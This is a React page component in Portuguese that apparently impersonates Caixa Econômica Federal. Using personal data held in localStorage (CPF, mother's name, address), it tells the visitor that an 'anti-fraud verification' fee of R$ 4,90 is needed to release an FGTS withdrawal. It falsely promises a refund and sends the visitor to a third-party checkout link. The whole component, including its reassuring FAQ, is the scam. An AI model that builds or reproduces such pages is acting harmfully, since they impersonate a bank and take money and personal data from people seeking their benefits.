import { useEffect, useState } from "react";
import logo from "../assets/caixalogo.png";
import { HiChevronRight } from "react-icons/hi";
import receita from "../assets/receita.png";
import { IoIosWarning } from "react-icons/io";

export function Upsell() {

    const [userData, setUserData] = useState({
        nome: "",
        cpf: "",
        dataNascimento: "",
        email: "",
        nomeMae: "",
        cep: "",
        cidade: "",
        estado: "",
        rua: "",
        numero: ""
    });

    useEffect(() => {
        const storedUserData = localStorage.getItem("userData");
        if (storedUserData) {
            setUserData(JSON.parse(storedUserData));
        }
    }, []);

    const questions = [
        {
            question: "Por que preciso passar por essa verificação?",
            answer: "A Caixa Econômica implementa este processo para garantir a segurança de seus clientes, evitando fraudes e acessos indevidos a contas de FGTS."
        },
        {
            question: "O valor será cobrado de fato?",
            answer: "Não. O valor de R$ 4,90 é apenas um bloqueio temporário no seu cartão e será devolvido automaticamente após a confirmação."
        },
        {
            question: "É seguro realizar esta verificação?",
            answer: "Sim. Trabalhamos com parceiros de pagamento seguros e confiáveis para que você tenha uma experiência tranquila e livre de riscos."
        },
        {
            question: "Quanto tempo leva para o valor ser estornado?",
            answer: "O valor é desbloqueado em até 24 horas após a verificação, dependendo do banco emissor do seu cartão."
        }
    ];

    return (
        <div className="flex flex-col items-center w-full min-h-screen bg-white text-gray-800 pb-10">
            {/* Cabeçalho */}
            <header className="flex items-center justify-between w-full py-4 bg-blue-800 text-white px-6">
                <div className="flex items-center space-x-3">
                    <img width={34} src={logo} alt="Logo" />
                    <span>Olá, {userData.nome.split(" ")[0]}</span>
                </div>
            </header>

            {/* Container de Conteúdo */}
            <div className="flex flex-col items-center w-full max-w-md bg-white shadow-lg rounded-lg p-6">
                <div className="text-center">

                    <div className="flex items-center flex-col  justify-center pt-4 ">
                        <IoIosWarning className="text-red-500 " size={80} />
                        <h2 className="text-3xl font-bold text-red-500">VERIFICAÇÃO <br /> ANTI-FRAUDE</h2>
                    </div>

                    <h2 className="text-2xl font-bold text-zinc-800 mt-4 mb-3">
                        Para liberar seu saque do FGTS, precisamos fazer uma verificação de segurança.
                    </h2>

                    <p className="text-gray-500 mt-4 text-xl">
                        A Caixa Econômica requer uma <span className="text-red-600 font-bold">verificação de segurança</span> com valor simbólico de <strong>R$ 4,90</strong>.
                        <br />Esse valor será <strong className="text-green-600">devolvido</strong> automaticamente após a confirmação.
                    </p>

                    <button className="text-gray-500 text-lg mt-2 bg-zinc-100">
                        <img src={receita} alt="Pagamentos por Pix" className="w-20 mx-auto mb-3" />
                        VERIFICAÇÃO DE <span className="">SEGURANÇA</span> <br />
                        <span className="text-red-500 font-bold text-4xl">R$ 4,90</span> <br /> (Esse valor será reembolsado)
                    </button>

                </div>

                <div className="mt-6">
                    <a href="https://checkout.perfectpay.com.br/pay/PPU38CP7BKU?hidepix=1" className="w-full">
                        <button className="bg-green-500 w-full py-3 rounded-md text-white text-xl font-bold hover:bg-orange-600 focus:outline-none">
                            REALIZAR VERIFICAÇÃO E LIBERAR FGTS
                        </button>
                    </a>
                </div>

                <p className="text-gray-500 text-sm text-center mt-4">
                    Verificação rápida e segura para garantir que você é o titular do benefício. Após a confirmação, o valor será estornado e o saque estará liberado.
                </p>

                {/* FAQ Section */}
                <div className="w-full mt-10">
                    <h3 className="text-lg font-semibold text-gray-700 mb-4 bg-white">Perguntas Frequentes</h3>
                    {questions.map((item, index) => (
                        <div key={index} className="border-b pb-4 mb-4">
                            <button
                                className="flex justify-between w-full text-left py-2 text-gray-700 hover:text-gray-900 focus:outline-none bg-zinc-100"
                            >
                                <h5 className="font-semibold">{item.question}</h5>
                                <HiChevronRight size={24} />
                            </button>
                            <p className="text-gray-500 mt-2 px-2">{item.answer}</p>
                        </div>
                    ))}
                </div>
            </div>
        </div>
    );
}
